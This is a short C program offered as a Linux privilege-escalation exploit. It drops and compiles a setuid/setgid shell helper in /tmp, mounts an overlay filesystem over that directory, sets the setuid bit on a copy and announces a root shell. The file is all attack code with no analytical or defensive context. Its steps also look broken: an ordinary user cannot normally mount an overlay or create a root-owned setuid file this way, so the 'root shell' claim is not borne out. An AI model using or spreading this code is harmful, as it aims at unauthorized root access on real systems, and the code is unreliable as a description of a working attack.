#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    system("mkdir -p /tmp/o /tmp/u /tmp/w");
    system("echo '#include <stdio.h>\n#include <stdlib.h>\nint main() { setuid(0); setgid(0); system(\"/bin/bash\"); return 0; }' > /tmp/o/x.c");
    system("gcc /tmp/o/x.c -o /tmp/o/x");
    system("mount -t overlay overlay -o lowerdir=/tmp/o,upperdir=/tmp/u,workdir=/tmp/w /tmp/o");
    system("cp /tmp/o/x /tmp/o/suid");
    system("chmod +s /tmp/o/suid");
    printf("\n[*] Exploit done. Run /tmp/o/suid to get root shell.\n");
    return 0;
}
